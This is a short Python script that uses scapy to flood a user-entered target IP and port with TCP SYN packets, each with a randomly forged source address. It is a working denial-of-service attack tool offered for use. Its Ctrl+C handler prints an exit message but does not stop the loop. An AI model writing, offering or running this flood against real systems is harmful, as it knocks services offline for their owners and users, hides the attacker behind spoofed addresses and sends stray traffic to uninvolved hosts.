from scapy.all import *
import random

def generate_random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def send_syn(source_ip, target_ip, target_port):
    ip = IP(src=source_ip, dst=target_ip)
    tcp = TCP(sport=random.randint(1024, 65535), seq=random.randint(0,4294967295), window=random.randint(1024,65535), dport=target_port, flags='S')
    syn_packet = ip / tcp
    send(syn_packet, verbose=False)

def main(target_ip, target_port):
    print(f"Sending SYN packets to {target_ip}:{target_port} from random source IPs...")
    print("Press Ctrl+C to stop.")
    while True:
           try:
            source_ip = generate_random_ip()
            send_syn(source_ip, target_ip, target_port)
           except KeyboardInterrupt:
            print("\nStopped by user. Exiting.")

if __name__ == "__main__":
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target port number: "))
    main(target_ip, target_port)
